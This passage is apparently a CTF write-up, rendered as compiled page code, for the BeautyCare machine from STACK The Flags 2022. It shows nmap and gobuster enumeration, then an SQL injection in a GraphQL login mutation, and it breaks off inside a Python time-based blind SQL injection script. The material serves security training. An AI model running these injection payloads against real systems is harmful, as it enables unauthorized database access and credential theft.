{"pageProps":{"post":{"mdxSource":"var Component=(()=>{var r=Object.create;var l=Object.defineProperty;var p=Object.getOwnPropertyDescriptor;var d=Object.getOwnPropertyNames;var h=Object.getPrototypeOf,m=Object.prototype.hasOwnProperty;var t=a=>l(a,\"__esModule\",{value:!0});var u=(a,s)=>()=>(s||a((s={exports:{}}).exports,s),s.exports),N=(a,s)=>{t(a);for(var c in s)l(a,c,{get:s[c],enumerable:!0})},k=(a,s,c)=>{if(s&&typeof s==\"object\"||typeof s==\"function\")for(let n of d(s))!m.call(a,n)&&n!==\"default\"&&l(a,n,{get:()=>s[n],enumerable:!(c=p(s,n))||c.enumerable});return a},g=a=>k(t(l(a!=null?r(h(a)):{},\"default\",a&&a.__esModule&&\"default\"in a?{get:()=>a.default,enumerable:!0}:{value:a,enumerable:!0})),a);var o=u((_,i)=>{i.exports=_jsx_runtime});var y={};N(y,{default:()=>w,frontmatter:()=>b});var e=g(o()),b={title:\"STACK The Flags 2022 Open \\u2013 Fullpwn\",date:\"2022-12-05\",draft:!1,authors:[\"elleuch\"],tags:[\"STACK The Flags 2022\",\"fullpwn\",\"Electron\",\"XSS\",\"RCE\",\"Selenium\",\"HackTheBox\"],summary:\"Fullpwn Solutions from STACK The Flags CTF\"};function f(a={}){let{wrapper:s}=a.components||{};return s?(0,e.jsx)(s,Object.assign({},a,{children:(0,e.jsx)(c,{})})):c();function c(){let n=Object.assign({h2:\"h2\",a:\"a\",span:\"span\",h3:\"h3\",p:\"p\",code:\"code\",pre:\"pre\",img:\"img\",blockquote:\"blockquote\",ol:\"ol\",li:\"li\",ul:\"ul\",h4:\"h4\"},a.components);return(0,e.jsxs)(e.Fragment,{children:[(0,e.jsxs)(n.h2,{id:\"beautycare-fullpwn-2000-points\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#beautycare-fullpwn-2000-points\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"BeautyCare (Fullpwn, 2000 Points)\"]}),`\n`,(0,e.jsxs)(n.h3,{id:\"enumeration\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#enumeration\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Enumeration\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"We started with a simple \",(0,e.jsx)(n.code,{children:\"nmap\"}),\" scan with the basic options:\"]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-bash\",children:(0,e.jsxs)(n.code,{className:\"language-bash code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"hcue@pjsk:~ \\xBB nmap -sC -sV -v \",(0,e.jsx)(n.span,{className:\"token number\",children:\"10.129\"}),`.228.37\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token number\",children:\"22\"}),\"/tcp \",(0,e.jsx)(n.span,{className:\"token function\",children:\"open\"}),\"  \",(0,e.jsx)(n.span,{className:\"token function\",children:\"ssh\"}),\"     OpenSSH \",(0,e.jsx)(n.span,{className:\"token number\",children:\"8\"}),\".2p1 Ubuntu 4ubuntu0.5 \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"Ubuntu Linux\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),\" protocol \",(0,e.jsx)(n.span,{className:\"token number\",children:\"2.0\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token number\",children:\"80\"}),\"/tcp \",(0,e.jsx)(n.span,{className:\"token function\",children:\"open\"}),\"  http    nginx \",(0,e.jsx)(n.span,{className:\"token number\",children:\"1.18\"}),\".0 \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"Ubuntu\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,e.jsx)(n.p,{children:\"The output shows that ports 22 (SSH) and 80 (HTTP) are open on the target IP address. The SSH service is running OpenSSH version 8.2p1 on Ubuntu Linux. The HTTP service is running nginx version 1.18.0 on Ubuntu Linux.\"}),`\n`,(0,e.jsx)(n.p,{children:\"Checking the Webserver running on port 80. We saw nothing interesting, pretty much everything is static and there is no leakage of a subdoamin/domain in the sources.\"}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/stack-the-flags-2022/beautycare-webpage.png\",alt:\"Beautycare Webpage\"})}),`\n`,(0,e.jsx)(n.p,{children:\"Since there is no domain until now, we can proceed to fuzz for hidden directories with gobuster.\"}),`\n`,(0,e.jsx)(n.pre,{className:\"language-bash\",children:(0,e.jsxs)(n.code,{className:\"language-bash code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"hcue@pjsk:~ \\xBB gobuster \",(0,e.jsx)(n.span,{className:\"token function\",children:\"dir\"}),` -w /usr/share/seclists/Discovery/Web-Content/big.txt  -u http://10.129.228.37\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Gobuster v3.2.0-dev\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"by OJ Reeves \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"@TheColonial\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"&\"}),\" Christian Mehlmauer \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"@firefart\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),\"+\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),` Url:                     http://10.129.228.37\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),\"+\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),` Method:                  GET\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),\"+\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),\" Threads:                 \",(0,e.jsx)(n.span,{className:\"token number\",children:\"10\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),\"+\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),` Wordlist:                /usr/share/seclists/Discovery/Web-Content/big.txt\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),\"+\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),\" Negative Status codes:   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"404\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),\"+\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),` User Agent:              gobuster/3.2.0-dev\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),\"+\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),` Timeout:                 10s\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token number\",children:\"2022\"}),\"/12/05 02:50:25 Starting gobuster \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"in\"}),` directory enumeration mode\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"==\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"/admin                \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"Status: \",(0,e.jsx)(n.span,{className:\"token number\",children:\"200\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),\"Size: \",(0,e.jsx)(n.span,{className:\"token number\",children:\"863\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),`\n`]})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"And we discovered that there is a hidden \",(0,e.jsx)(n.code,{children:\"/admin\"}),\" endpoint which is a simple admin login page.\"]}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/stack-the-flags-2022/admin-login.png\",alt:\"Admin Login\"})}),`\n`,(0,e.jsx)(n.p,{children:\"I tried to login with some dummy/default credentials. But that didn\\u2019t help.\"}),`\n`,(0,e.jsx)(n.p,{children:\"Checking Burp HTTP history for the requests:\"}),`\n`,(0,e.jsx)(n.pre,{className:\"language-graphql\",children:(0,e.jsxs)(n.code,{className:\"language-graphql code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"query\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),\"\\\\\",(0,e.jsx)(n.span,{className:\"token property\",children:\"n\"}),\"    \",(0,e.jsx)(n.span,{className:\"token object\",children:\"LoginUser\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),(0,e.jsx)(n.span,{className:\"token attr-name\",children:\"username\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \\\\\",(0,e.jsx)(n.span,{className:\"token string\",children:'\"admin\\\\\",password : \\\\\"admin\\\\\"}{\\\\n     message,\\\\n   token \\\\n}\\\\n}\"'}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),`\n`]})]})}),`\n`,(0,e.jsxs)(n.p,{children:[(0,e.jsx)(n.a,{href:\"https://graphql.org/\",children:\"GraphQL\"}),\" is a popular query language for APIs that allows clients to query and mutate data on a server. This mutation queries a \",(0,e.jsx)(n.code,{children:\"LoginUser\"}),\" function with the provided username and password. The function is expected to return a message and a token if the login is successful.\"]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-graphql\",children:(0,e.jsxs)(n.code,{className:\"language-graphql code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"mutation\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token property-query property-mutation\",children:\"LoginUser\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token attr-name\",children:\"username\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"admin\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token attr-name\",children:\"password\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"admin\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"        \",(0,e.jsx)(n.span,{className:\"token property\",children:\"message\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"        \",(0,e.jsx)(n.span,{className:\"token property\",children:\"token\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),`\n`]})]})}),`\n`,(0,e.jsx)(n.p,{children:\"The first thing I tried was introspection, which allows clients to inspect the schema of a GraphQL server to understand the data and operations that are available. But it didn\\u2019t lead to anything.\"}),`\n`,(0,e.jsxs)(n.h3,{id:\"exploitation\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#exploitation\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Exploitation\"]}),`\n`,(0,e.jsx)(n.p,{children:\"Then, I\\u2019ve tried to add bad characters in the username field. Adding a single quote results in an interesting error:\"}),`\n`,(0,e.jsx)(n.pre,{className:\"language-graphql\",children:(0,e.jsxs)(n.code,{className:\"language-graphql code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"query\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),\"\\\\\",(0,e.jsx)(n.span,{className:\"token property\",children:\"n\"}),\"    \",(0,e.jsx)(n.span,{className:\"token object\",children:\"LoginUser\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),(0,e.jsx)(n.span,{className:\"token attr-name\",children:\"username\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \\\\\",(0,e.jsx)(n.span,{className:\"token string\",children:`\"admin'\\\\\",password : \\\\\"admin\\\\\"}{\\\\n     message,\\\\n   token \\\\n}\\\\n}\"`}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),`\n`]})]})}),`\n`,(0,e.jsx)(n.p,{children:\"It seems like the username field is vulnerable to an SQL injection. Since GraphQL is somehow interacting with the SQL database, We\\u2019ll not be able to bypass the login with it.\"}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/stack-the-flags-2022/trying-sqli-query.png\",alt:\"Trying Sqli Query\"})}),`\n`,(0,e.jsxs)(n.p,{children:[\"For the sake of this part, I\\u2019ll be using a time-based blind SQL injection attack to extract information from a GraphQL server. The code sends a series of HTTP requests to the server, each containing a slightly different GraphQL query, and measures the time taken for the server to respond to each request. By comparing the response times of different requests, the code is able to determine which requests were successful in extracting information from the server. If the response time is greater than 2 seconds, the code assumes that the query was successful in extracting information from the server, and the character that was used in the query is appended to the \",(0,e.jsx)(n.code,{children:\"res\"}),\" string.In this case, I just guessed the table name and columns and I got a delay.\"]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-python\",children:(0,e.jsxs)(n.code,{className:\"language-python code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"import\"}),` requests\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"import\"}),` time\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"import\"}),` os\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:'#printable=\"a0123456789bcdefghijklmnopqrstuvwxyz\"'}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"printable\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"0123456789abcdefABCDEFGHIJKLMNOPQRSTUVWXYZ\"'}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"res\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"\"'}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"while\"}),\" \",(0,e.jsx)(n.span,{className:\"token boolean\",children:\"True\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"for\"}),\" char \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"in\"}),\" printable\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"        time\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"sleep\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0.6\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"        session \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" requests\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"session\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"        burp0_url \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"http://10.129.255.194:80/graphql\"'}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"        burp0_headers \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"User-Agent\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"Content-Type\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"application/json\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"Accept\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"*/*\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"Origin\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"http://10.129.255.194\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"Referer\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"http://10.129.255.194/admin\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"Accept-Encoding\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"gzip, deflate\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"Accept-Language\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"en-US,en;q=0.9\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"Connection\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"close\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"        burp0_json\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"query\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:`\"mutation {\\\\n    LoginUser(username: \\\\\"-12' or (select sleep(2) from dual where (SELECT username from users ) like '\"`}),(0,e.jsx)(n.span,{className:\"token 